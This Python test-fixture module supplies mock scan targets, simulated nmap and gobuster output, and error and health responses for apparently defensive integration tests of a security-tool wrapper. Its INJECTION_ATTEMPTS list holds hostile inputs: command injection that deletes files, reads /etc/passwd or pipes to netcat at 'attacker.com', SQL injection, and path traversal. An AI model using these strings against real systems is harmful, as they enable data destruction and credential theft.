"""
Mock targets and test data for security tool integration tests.

This module provides realistic mock targets, scan results, and test data
for use in integration tests without requiring actual network scanning.
"""

from typing import Dict, List, Any
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class MockTarget:
    """Represents a mock target for security scanning."""

    hostname: str
    ip: str
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    os_info: str = "Linux"
    response_time: float = 0.1


# Valid test targets
VALID_TARGETS = {
    "scanme": MockTarget(
        hostname="scanme.nmap.org",
        ip="45.33.32.156",
        open_ports=[22, 80, 9929, 31337],
        services={
            22: "ssh",
            80: "http",
            9929: "nping-echo",
            31337: "Elite"
        },
        response_time=0.087
    ),
    "localhost": MockTarget(
        hostname="localhost",
        ip="127.0.0.1",
        open_ports=[22, 80, 443],
        services={
            22: "ssh",
            80: "http",
            443: "https"
        },
        response_time=0.001
    ),
    "local_network": MockTarget(
        hostname="router.local",
        ip="192.168.1.1",
        open_ports=[53, 80, 443],
        services={
            53: "dns",
            80: "http",
            443: "https"
        },
        response_time=0.005
    )
}


# Invalid targets for error testing
INVALID_TARGETS = {
    "invalid_ip": "999.999.999.999",
    "malformed_hostname": "not a valid hostname!@#",
    "empty": "",
    "null_byte": "target\x00.com",
}


# Command injection attempts
INJECTION_ATTEMPTS = [
    "127.0.0.1; rm -rf /",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1 || echo 'injected'",
    "127.0.0.1 | nc attacker.com 4444",
    "127.0.0.1`whoami`",
    "127.0.0.1$(whoami)",
    "'; DROP TABLE scans; --",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
]


# Mock nmap scan results
MOCK_NMAP_RESULTS = {
    "basic_scan": {
        "tool": "nmap",
        "target": "scanme.nmap.org",
        "status": "completed",
        "return_code": 0,
        "stdout": """
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-12 04:00 UTC
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.087s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
9929/tcp  open  nping-echo
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
        """.strip(),
        "stderr": "",
        "duration": 2.43,
        "ports_found": [22, 80, 9929, 31337],
        "timestamp": datetime.now().isoformat()
    },
    "version_scan": {
        "tool": "nmap",
        "target": "scanme.nmap.org",
        "arguments": ["-sV"],
        "status": "completed",
        "return_code": 0,
        "stdout": """
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-12 04:00 UTC
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.087s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
        """.strip(),
        "stderr": "",
        "duration": 8.76,
        "ports_found": [22, 80],
        "timestamp": datetime.now().isoformat()
    },
    "no_ports_open": {
        "tool": "nmap",
        "target": "192.168.1.254",
        "status": "completed",
        "return_code": 0,
        "stdout": """
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-12 04:00 UTC
Nmap scan report for 192.168.1.254
Host is up (0.0024s latency).
All 1000 scanned ports on 192.168.1.254 are in ignored states.

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
        """.strip(),
        "stderr": "",
        "duration": 1.12,
        "ports_found": [],
        "timestamp": datetime.now().isoformat()
    },
    "host_down": {
        "tool": "nmap",
        "target": "10.0.0.254",
        "status": "completed",
        "return_code": 0,
        "stdout": """
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-12 04:00 UTC
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.08 seconds
        """.strip(),
        "stderr": "",
        "duration": 3.08,
        "ports_found": [],
        "timestamp": datetime.now().isoformat()
    }
}


# Mock gobuster scan results
MOCK_GOBUSTER_RESULTS = {
    "directory_scan": {
        "tool": "gobuster",
        "mode": "dir",
        "target": "http://scanme.nmap.org",
        "status": "completed",
        "return_code": 0,
        "stdout": """
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://scanme.nmap.org
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 312] [--> http://scanme.nmap.org/images/]
/index                (Status: 200) [Size: 7777]
/shared               (Status: 301) [Size: 312] [--> http://scanme.nmap.org/shared/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
        """.strip(),
        "stderr": "",
        "found_paths": ["/images", "/index", "/shared"],
        "duration": 12.45,
        "timestamp": datetime.now().isoformat()
    },
    "subdomain_scan": {
        "tool": "gobuster",
        "mode": "dns",
        "target": "example.com",
        "status": "completed",
        "return_code": 0,
        "stdout": """
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     example.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.example.com
Found: mail.example.com
Found: ftp.example.com
Found: admin.example.com
===============================================================
Finished
===============================================================
        """.strip(),
        "stderr": "",
        "found_subdomains": ["www", "mail", "ftp", "admin"],
        "duration": 45.32,
        "timestamp": datetime.now().isoformat()
    },
    "no_results": {
        "tool": "gobuster",
        "mode": "dir",
        "target": "http://example.com",
        "status": "completed",
        "return_code": 0,
        "stdout": """
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://example.com
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
        """.strip(),
        "stderr": "",
        "found_paths": [],
        "duration": 8.12,
        "timestamp": datetime.now().isoformat()
    }
}


# Mock error responses
MOCK_ERRORS = {
    "invalid_target": {
        "tool": "nmap",
        "target": "999.999.999.999",
        "status": "failed",
        "return_code": 2,
        "stdout": "",
        "stderr": "Failed to resolve \"999.999.999.999\".",
        "error": "Invalid target specified",
        "timestamp": datetime.now().isoformat()
    },
    "timeout": {
        "tool": "nmap",
        "target": "scanme.nmap.org",
        "status": "timeout",
        "return_code": -1,
        "stdout": "Starting Nmap 7.94...\n",
        "stderr": "Command timed out after 180 seconds",
        "error": "Scan exceeded maximum timeout",
        "timestamp": datetime.now().isoformat()
    },
    "tool_not_found": {
        "tool": "nmap",
        "target": "scanme.nmap.org",
        "status": "failed",
        "return_code": 127,
        "stdout": "",
        "stderr": "nmap: command not found",
        "error": "Required tool not installed",
        "timestamp": datetime.now().isoformat()
    },
    "permission_denied": {
        "tool": "nmap",
        "target": "scanme.nmap.org",
        "arguments": ["-O"],
        "status": "failed",
        "return_code": 1,
        "stdout": "",
        "stderr": "You requested a scan type which requires root privileges.",
        "error": "Insufficient permissions",
        "timestamp": datetime.now().isoformat()
    }
}


# Mock health check responses
MOCK_HEALTH_RESPONSES = {
    "healthy": {
        "status": "healthy",
        "version": "1.0.0",
        "uptime": 3600,
        "tools": {
            "nmap": {"available": True, "version": "7.94"},
            "gobuster": {"available": True, "version": "3.6"},
            "nikto": {"available": True, "version": "2.5.0"},
            "sqlmap": {"available": True, "version": "1.7.11"}
        },
        "system": {
            "cpu_percent": 23.5,
            "memory_percent": 45.2,
            "disk_percent": 62.8
        },
        "timestamp": datetime.now().isoformat()
    },
    "degraded": {
        "status": "degraded",
        "version": "1.0.0",
        "uptime": 3600,
        "tools": {
            "nmap": {"available": True, "version": "7.94"},
            "gobuster": {"available": False, "error": "not found"},
            "nikto": {"available": True, "version": "2.5.0"},
            "sqlmap": {"available": True, "version": "1.7.11"}
        },
        "system": {
            "cpu_percent": 89.5,
            "memory_percent": 92.1,
            "disk_percent": 95.3
        },
        "warnings": ["High system resource usage", "gobuster not available"],
        "timestamp": datetime.now().isoformat()
    }
}


def get_mock_result(tool: str, scenario: str) -> Dict[str, Any]:
    """
    Get a mock result for a specific tool and scenario.

    Args:
        tool: Tool name (nmap, gobuster, etc.)
        scenario: Scenario name (basic_scan, error, etc.)

    Returns:
        Mock result dictionary
    """
    if tool == "nmap":
        return MOCK_NMAP_RESULTS.get(scenario, MOCK_ERRORS.get(scenario, {}))
    elif tool == "gobuster":
        return MOCK_GOBUSTER_RESULTS.get(scenario, MOCK_ERRORS.get(scenario, {}))
    else:
        return {}


def generate_large_output(size_kb: int = 100) -> str:
    """
    Generate large mock output for testing.

    Args:
        size_kb: Approximate size in kilobytes

    Returns:
        Large string of mock output
    """
    line = "PORT     STATE SERVICE VERSION\n"
    lines_needed = (size_kb * 1024) // len(line)
    return line * lines_needed
